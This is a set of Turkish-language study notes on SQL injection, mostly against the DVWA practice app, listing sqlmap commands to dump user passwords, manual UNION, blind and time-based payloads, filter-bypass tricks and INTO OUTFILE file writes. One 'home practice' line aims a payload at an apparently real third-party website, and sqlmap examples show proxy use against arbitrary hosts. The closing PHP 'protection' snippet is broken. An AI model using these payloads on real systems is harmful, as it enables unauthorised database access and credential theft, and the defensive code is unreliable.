---------------------SQLMAP DVWA LOW ÇÖZÜMLERİ-----------------------------------------------------------------------
python sqlmap.py -u 'saldirilacak url' --cookie=' ' --string=Surname --dbs
 
python sqlmap.py -u 'saldirilacak url' --cookie=' ' --string=Surname -D dvwa --tables

python sqlmap.py -u 'saldirilacak url' --cookie=' ' --string=Surname -D dvwa -T users --columns

python sqlmap.py -u 'saldirilacak url ' --cookie=' ' --string=Surname -D dvwa -T users -C user,first_name,last_name,password

python sqlmap.py -u 'saldirilacak url' --cookie=' ' --string=Surname -D dvwa -T users -C user,password 

python sqlmap.py -u 'saldirilacak url' --cookie='' --string=Surname -D dvwa -T users -C user,password --dump

python sqlmap.py -u 'saldirilacak url' --cookie=' ' --string=Surname --dbms MySQL

python sqlmap.py -u 'saldirilacak url' --cookie=' ' --string=Surname -D dvwa --tables


==================================================================================================================================================
DVWA MANÜEL ÇÖzümler
low
1' and 1=1 union select database(),user()#
1' and 1=1 union select null,table_name from information_schema.tables where table_schema='dvwa' #
1' and 1=1 union select null,column_name from information_schema.columns where table_schema='dvwa' #
1' and 1=1 union select user,password from users#
__________________________________________________________________________________________________________
Eğer union'u kullanmamıza izin vermezse aşağıdaki koddaki UNIunionON daki küçük harfle yazılanları siler 
1' and 1=1 UNIunionON select database(),user()# 
$str=strtolower($_GET['id']);
	$id = str_replace("union","",$str);
__________________________________________________________________________________________________________
YASAKLI 
$id =str_replace("=","",$str);
$id =str_replace(">","",$str);
$id =str_replace("<","",$str);
1' and 1=1 union select user,password from users#

1' and 2 between 1 and 3 union select user,password from users#
1' or TRUE#


Medium
19 or  union select version(),database()
19 or 1=1 union select null, user()
19 or 1=1 union select null, table_name from information_schema.tables
19 or 1=1 union select null, concat(table_name,0x0a,column_name) from information_schema.columns
19 or 1=1 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name=0x7573657273
19 or 1=1 union select null, concat(first_name,0x0a,password) from users
19 or 1=1 union select null,@@datadir
19 or 1=1 union select null,@@hostname
==================================================================================================================================================
---------------------------------Mehmet Hoca DVWA ÇÖZÜMLERİ-------
123 union select table_name,null from information_schema.tables
123 union select table_name,null from information_schema.tables where table_schema='dvwa' hata verir 
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'dvwa\'' at line 1

123 union select table_name,null from information_schema.tables where table_name=0x7573657273
123 union select table_name,null from information_schema.tables where table_name=(select database())
123 union select table_name,null from information_schema.tables where table_name=char(10011811997) //dvwa ascii karşılığı
123 union select table_name,null from information_schema.tables where table_name=char(ascii('dvwa'))




Örnekler
http://localhost/DVWA/vulnerabilities/sqli/?id=2 union select user,password from users &Submit=Submit# 
2 union select user,password from users

http://localhost/DVWA/vulnerabilities/sqli/?id=e' union select 1,2 into outfile '/tmp/cihan.txt'  %23&Submit=Submit#
SQL INJECTION KARŞI TARAFTAKİ DOSYAYI OKUMA


SQL INJECTION KARŞI TARAFA DOSYA OLUŞTURMA ve YAZDIRMA
http://localhost/DVWA/vulnerabilities/sqli/?id=e' union select  '<?php phpinfo(); ?>', 'cihan'  INTO OUTFILE '/tmp/mehmety.txt' %23&Submit=Submit#

Blind SQL İnjection

1' and 1=0 union select null,table_name from information_schema.tables#
1' and 1=0 union select null,table_name from information_schema.columns where table_name='users'#
1' and 1=0 union select null,concat(table_name,0x0a,column_name) from information_schema.columns where table_name='users'#
1' and 1=0 union select null,concat(first_name,0x0a,password) from users #
1 and  1=0 union select table_name,column_name from information_schema.columns where table_name=0x7573657273

---Mehmet Hoca------
http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1' AND substring(version(),1,1)=5 %23 &Submit=Submit#
substring ilk parametresinde bir kolan çekeriz 

http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1'AND ASCII(substring((SELECT table_name From information_schema.tables where table_schema='dvwa' LIMIT 1,1),1,1))>117 %23 &Submit=Submit#
burada 117 bravo vermeyip 116'da pravo verirse cevap 177'dir 117'nin ASCII kod karşılığını buluruz 177=u böyle teker teker deneriz 

Time Based
http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1' AND IF (substring(version(),1,1)=5,SLEEP(10),2) %23 &Submit=Submit#
eşittir 5 yerine 4 yazarsak hemen oynar 


SELECT * FROM xyz WHERE id=3 AND 2=IF(1=2,2,3)


-----------------------------Kendim Evde Çalışma--------------------------------------------
index.php?id=-69 UNION SELECT 1,2,unhex(hex(@@version)),4,5,6,7,8,9
Tüm kolonların table_name görüntüler
http://www.motorfilms.com/videos.php?id=1 union+select+0,1,group_concat(char(60,112,62),table_name),3,4,5,6,7,8,9,10,11,12,13 from information_schema.tables
char(60,112,62) burada kolonların yanyana değil de alt alta sıralanmasını sağlar

--------------------------------------------------Önemli Linkler-------------------------------------------------------

http://www.greensql.com/article/protect-yourself-sqli-attacks-create-backdoor-web-server-using-mysql
http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
http://ferruh.mavituna.com/turkce-sql-injection-referansi-oku/
https://www.exploit-db.com/papers/13045/


SQL MAP Kullanımı 
http://samiux.blogspot.com.tr/2013/08/howto-dvwa-sql-injection.html

DATABASE Bulma

sqlmap -u "http://www.hackle.com/index.php?id=19" --dbms

TABLO Bulma

sqlmap -u "http://www.hackle.com/index.php?id=19" --tables -D database_adi

KOLON Alma

sqlmap -u "http://www.hackle.com/index.php?id=19" --columns -D database_adi -T tablo_Adi

Kolonlar olmadan, ben tabloyu indirme

sqlmap -u "http://www.hackle.com/index.php?id=19" --dump -D database_adi -T tablo_Adi

belirli birkaç kolonu download etmek

sqlmap -u "http://www.hackle.com/index.php?id=19" --dump -C kolon1,kolon2 -D database_adi -T tablo_Adi

Tamam da SQL sadece GET parametresi ile mi olmak zorunda ? POST parametreli bir sql arıyorsak ne yapmalıyız diyorsanız;

sqlmap -u "http://www.hackle.com/index.php?id=19" --data="Post verisi" --dbms

sqlmap -u "http://www.hackle.com/index.php?id=19" --data="adi=merdincz&domain=merdincz.com" --dbms


Peki tüm parametreleri taraması yerine, sadece benim belirttiğim parametrede sql denemesini nasıl sağlatabiliriz ?

sqlmap -u "http://www.ornek.com/index.php?id=2&parametre=2" -p "parametre" -dbms

veya
sqlmap -u "http://www.ornek.com/index.php?id=2&parametre=2*" -dbms


Tamam peki hepsi iyi güzel de, ip işi için ne yapıcaz ? Proxy desteği var mıdır derseniz;

sqlmap -u "http://www.ornek.com/index.php?id=2" -dbms --proxy="IP:Port" --proxy-cred="KulAdi:Sifre"


Yaptığı tüm işlemleri sql sorgularını, cevaplarını nasıl görebilirim diyorsanız;

sqlmap -u "http://www.ornek.com/index.php?id=2" -dbms -t /usr/share/log.txt



-------------------------------------SQLMAP Mehmet Hoca DVWA----------------------------------------
python sqlmap.py -u "http://localhost/DVWA/vulnerabilities/sqli/?id=5&Submit=Submit#" --cookie "security=low; PHPSESSID=kqoluf39d64pj0k2ot727fqjp2" 
--dbms MySQL -p id


=================================================SQL INJECTION OMER=============================================
 sql injectinda eger union gibi ifadeleri girmemize izin verilmemişse uniUNIONon gibi kullanarak bu korumayı 
 aşabiliyorduk bunu str_replace('union','') kullanarak önlemiş olduk.Tüm olarak eklemek istersek
 
 Adres bypas.php?ad=union
 ------------------------------------------------------------------------------------------------------------
 $ad=$_GET['ad'];
 while(true)
 {
 	 $a=str_replace('union','',$ad);
 	 $sonuc=strpos($ad,'union');
 	 if($sonuc == false) {
 	 	break;
         }
 }
 echo $ad;
 -----------------------------------------------------------------------------------------------------------
Yukarıdaki koddaki gibi unionu nasıl yazarsan yaz ekrana basmaz, 3osUNIsasON bunu 3ossas olarak ekrana yazar.



 








